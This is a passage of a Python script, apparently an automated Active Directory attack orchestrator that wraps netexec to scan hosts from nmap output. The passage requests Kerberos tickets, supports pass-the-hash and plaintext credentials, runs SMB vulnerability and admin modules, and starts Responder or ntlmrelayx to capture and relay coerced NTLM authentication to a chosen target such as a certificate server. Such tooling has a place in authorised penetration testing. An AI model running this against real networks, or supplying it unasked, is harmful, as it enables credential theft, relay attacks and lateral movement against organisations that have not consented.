            tgt_file = str(Path(cfg["output_dir"]) / f"{cfg['username']}.ccache")
            info(f"Requesting TGT from {tgt_dc} → {tgt_file}")
            subprocess.run([cfg["nxc_bin"], "smb", tgt_dc,
                            "-u", cfg["username"], "-p", cfg["password"],
                            "--gen-tgt", tgt_file], check=False)
            if Path(tgt_file).exists():
                os.environ["KRB5CCNAME"] = tgt_file
                cfg["auth_mode"]   = "kcache"
                cfg["kcache_flag"] = _kcache_flag(cfg["nxc_bin"])
                ok(f"TGT saved. KRB5CCNAME={tgt_file}")
            else:
                warn("TGT failed, using password auth.")
        else:
            cfg["auth_mode"] = "password"
            cfg["username"]  = input(f"{B}Username:{RST} ").strip()
            cfg["password"]  = getpass(f"{B}Password:{RST} ")

    # local auth
    cfg["local_auth"] = args.local_auth or \
        input(f"{B}Use --local-auth? [y/N]:{RST} ").strip().lower() == "y"

    # SMB mode
    if args.smb_all:
        cfg["smb_mode"] = "all"
    else:
        print(f"\n{B}SMB scan mode:{RST}")
        print("  1) Low-privilege only    2) All (includes admin modules)")
        cfg["smb_mode"] = "all" if input(f"{B}Choice [1/2]:{RST} ").strip() == "2" else "lowpriv"

    # Listener IP
    detected = detect_local_ip()
    prompt = input(f"{B}Attacker/Listener IP for coerce_plus{RST} [detected: {G}{detected}{RST}]: ").strip()
    cfg["listener_ip"] = prompt or detected

    # Listener tool
    print(f"\n{B}Listener for coerced auth:{RST}")
    print("  1) None (check only)  2) Responder  3) ntlmrelayx")
    listener_choice = input(f"{B}Choice [1-3]:{RST} ").strip()
    cfg["listener_choice"] = listener_choice
    cfg["listener_iface"] = ""
    cfg["relay_target"] = ""
    if listener_choice == "2":
        cfg["listener_iface"] = input(f"{B}Interface for Responder (e.g. tun0):{RST} ").strip()
    elif listener_choice == "3":
        cfg["relay_target"] = input(f"{B}Relay target (e.g. http://dc01/certsrv):{RST} ").strip()

    # Concurrency
    cfg["max_workers"] = args.threads or 6

    return cfg


# ── Main ──────────────────────────────────────────────────────────────────────
def main():
    parser = argparse.ArgumentParser(
        description="NXC Auto-Scanner — concurrent netexec module runner",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Interactive wizard
  python3 nxc_scan.py

  # Full CLI (no prompts)
  python3 nxc_scan.py -u administrator -p 'P@ss!' -d corp.local --smb-all

  # Pass-the-hash
  python3 nxc_scan.py -u administrator -H aad3b435b51404eeaad3b435b51404ee:ntlmhash

  # Kerberos ccache
  python3 nxc_scan.py -u user --use-kcache -d corp.local
        """
    )
    parser.add_argument("--nmap-dir",    default=None, help="nmap output directory (default: nmap)")
    parser.add_argument("--output-dir",  default=None, help="output directory (default: netexecscan)")
    parser.add_argument("-u", "--username", default=None)
    parser.add_argument("-p", "--password", default=None)
    parser.add_argument("-H", "--hash",     default=None, help="NTLM hash (LM:NT or NT only)")
    parser.add_argument("--use-kcache",  action="store_true", help="use Kerberos ccache (KRB5CCNAME)")
    parser.add_argument("-d", "--domain",   default=None)
    parser.add_argument("--kdc",            default=None, help="KDC/DC IP")
    parser.add_argument("--local-auth",  action="store_true")
    parser.add_argument("--smb-all",     action="store_true", help="run admin SMB modules too")
    parser.add_argument("-t", "--threads", type=int, default=None,
                        help="concurrent module threads (default: 6)")
    args = parser.parse_args()

    banner()

    cfg  = wizard(args)
    nmap_dir    = Path(cfg["nmap_dir"])
    output_dir  = Path(cfg["output_dir"])
    output_dir.mkdir(parents=True, exist_ok=True)

    # ── Stage 1: parse nmap ───────────────────
    section("STAGE 1 — Extracting hosts from nmap output")
    proto_hosts = parse_nmap_dir(nmap_dir)

    if not proto_hosts:
        fail("No open hosts found in nmap output. Exiting."); sys.exit(1)

    for proto, hosts in proto_hosts.items():
        ok(f"[{proto}] {len(hosts)} host(s): {', '.join(hosts)}")

    host_files = write_host_files(proto_hosts, output_dir)

    # ── Stage 2: pre-auth check ───────────────
    cfg, _auth_status = precheck(cfg, proto_hosts, host_files)

    # ── Start listener ────────────────────────
    listener = Listener()
    signal.signal(signal.SIGINT,  lambda s, f: (listener.stop(), sys.exit(0)))
    signal.signal(signal.SIGTERM, lambda s, f: (listener.stop(), sys.exit(0)))

    if cfg["listener_choice"] == "2" and cfg["listener_iface"]:
        section("Starting Responder")
        listener.start_responder(cfg["listener_iface"], output_dir)
    elif cfg["listener_choice"] == "3" and cfg["relay_target"]:
        section("Starting ntlmrelayx")
        listener.start_ntlmrelayx(cfg["relay_target"], output_dir)

    # ── Stage 3: build job list ───────────────
    section("STAGE 3 — Building module job list")

    all_jobs = []  # (label, proto, cmd, no_auth)

    def add_modules(module_list, host_file):
        for label, args_tmpl, requires_auth, admin_only in module_list:
            cmd = build_cmd(cfg["nxc_bin"], args_tmpl, host_file,
                            output_dir, cfg["listener_ip"])
            no_auth = not requires_auth
            all_jobs.append((label, args_tmpl[0], cmd, no_auth))

    if "smb" in proto_hosts:
        f = host_files["smb"]
        add_modules(SMB_MODULES_LOWPRIV, f)
        add_modules(SMB_VULN_MODULES, f)
        if cfg["smb_mode"] == "all":
            add_modules(SMB_ADMIN_MODULES, f)

    if "ldap" in proto_hosts:
        add_modules(LDAP_MODULES, host_files["ldap"])

    if "mssql" in proto_hosts:
        add_modules(MSSQL_MODULES, host_files["mssql"])

    if "winrm" in proto_hosts:
        add_modules(WINRM_MODULES_LOWPRIV, host_files["winrm"])
        if cfg["smb_mode"] == "all":
            add_modules(WINRM_ADMIN_MODULES, host_files["winrm"])

    for proto in ["ssh", "rdp", "ftp", "wmi", "vnc", "nfs"]:
        if proto in proto_hosts:
            mods = OTHER_PROTO_MODULES.get(proto, [])
            # Special case: FTP anonymous uses different creds
            final_mods = []
            for m in mods:
                if m[0] == "FTP_anon":
                    # Build anon command directly without auth flags
                    cmd = [cfg["nxc_bin"], "ftp", str(host_files["ftp"]),
                           "-u", "anonymous", "-p", "anonymous", "--ls"]
                    all_jobs.append(("FTP_anonymous", "ftp", cmd, True))
                else:
                    final_mods.append(m)
            add_modules(final_mods, host_files[proto])

    info(f"Total modules queued: {B}{len(all_jobs)}{RST}")
    info(f"Max concurrent workers: {B}{cfg['max_workers']}{RST}")

    # ── Dry-run: show first command so user can verify auth looks correct ──
    if all_jobs:
        label, proto, sample_cmd, no_auth = all_jobs[0]
        full = sample_cmd + ([] if no_auth else auth_args(cfg))
        info(f"Sample command (first module): {C}{' '.join(full)}{RST}")
        confirm = input(f"{B}Does this look correct? [Y/n]:{RST} ").strip().lower()
        if confirm == "n":
            print("Aborted — re-run and adjust credentials.")
            sys.exit(0)

    # ── Stage 3: run concurrently ─────────────
    section("STAGE 3 — Running modules concurrently")
    all_results = run_concurrent(all_jobs, cfg, output_dir, cfg["max_workers"])

    # ── Reports ───────────────────────────────
    section("Writing reports")
    write_reports(all_results, output_dir, cfg, proto_hosts)

    listener.stop()

    info(f"\nAll done. Results in: {B}{output_dir}/{RST}")


if __name__ == "__main__":
    main()
